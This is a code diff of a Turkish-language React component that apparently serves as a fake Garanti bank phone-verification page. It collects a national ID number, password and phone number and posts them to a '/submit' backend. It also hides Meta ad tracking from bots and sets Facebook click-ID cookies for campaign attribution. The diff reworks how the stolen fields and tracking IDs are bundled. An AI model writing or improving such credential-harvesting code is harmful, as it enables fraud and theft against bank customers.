@@ -1,3 +1,4 @@
+// src/Telefon.js
 import React, { useState, useEffect } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
 import axios from 'axios';
@@ -30,7 +31,6 @@ function Telefon({ isBot }) {
       const fbc = fbcCookie.split('=')[1];
       return fbc;
     }
-
     const urlParams = new URLSearchParams(window.location.search);
     const fbclid = urlParams.get('fbclid');
     if (fbclid) {
@@ -51,6 +51,18 @@ function Telefon({ isBot }) {
       content_name: 'garanti_phone_verification_page',
     });
   }, [isBot]);
+
+  // fbclid kontrolü – her sayfada
+  useEffect(() => {
+    const urlParams = new URLSearchParams(window.location.search);
+    const fbclid = urlParams.get('fbclid');
+    if (fbclid && !document.cookie.includes('_fbc=')) {
+      const creationTime = Math.floor(Date.now() / 1000);
+      const fbcValue = `fb.1.${creationTime}.${fbclid}`;
+      const secureFlag = window.location.protocol === 'https:' ? '; Secure' : '';
+      document.cookie = `_fbc=${fbcValue}; path=/; max-age=31536000; SameSite=Lax${secureFlag}`;
+    }
+  }, []);
 
   const trackMetaLead = async (phone, eventID) => {
     if (isBot || typeof window === 'undefined' || !window.fbq) return;
@@ -108,29 +120,32 @@ function Telefon({ isBot }) {
   const handleSubmit = async (e) => {
     e.preventDefault();
     setPhoneError('');
-
     const cleanPhone = phoneNumber.replace(/\D/g, '');
     if (cleanPhone.length !== 10 || !cleanPhone.startsWith('5')) {
       setPhoneError('Telefon numarası 10 haneli olmalı ve 5 ile başlamalı.');
       return;
     }
 
-    const payload = {
-      tc: authState.tc,
-      phone: cleanPhone,
-      password: authState.password,
-    };
+    const leadEventID = `lead_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+    const completeEventID = `complete_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+    const completeEventTime = Math.floor(Date.now() / 1000);
 
     try {
       setIsSubmitting(true);
-
-      const leadEventID = `lead_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
       await trackMetaLead(cleanPhone, leadEventID);
 
-      payload.eventID = leadEventID;
-      payload.initEventID = location.state?.initEventID;
-      payload.fbp = getFbp();
-      payload.fbc = getFbc();
+      const payload = {
+        tc: authState.tc,
+        phone: cleanPhone,
+        password: authState.password,
+        eventID: leadEventID,
+        initEventID: location.state?.initEventID,
+        initEventTime: location.state?.initEventTime,
+        fbp: getFbp(),
+        fbc: getFbc(),
+        completeEventID,
+        completeEventTime
+      };
 
       const apiUrl = process.env.REACT_APP_API_URL || 'http://localhost:3001';
       const response = await axios.post(`${apiUrl}/submit`, payload);
@@ -138,14 +153,14 @@ function Telefon({ isBot }) {
 
       dispatch({ type: 'SET_PHONE_VERIFIED' });
 
-      const completeEventID = `complete_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
       navigate('/bekleme', {
         state: {
           isValidNavigation: true,
           from: '/telefon',
           isCompleted: true,
           leadEventID,
-          completeEventID
+          completeEventID,
+          completeEventTime
         }
       });
     } catch (error) {
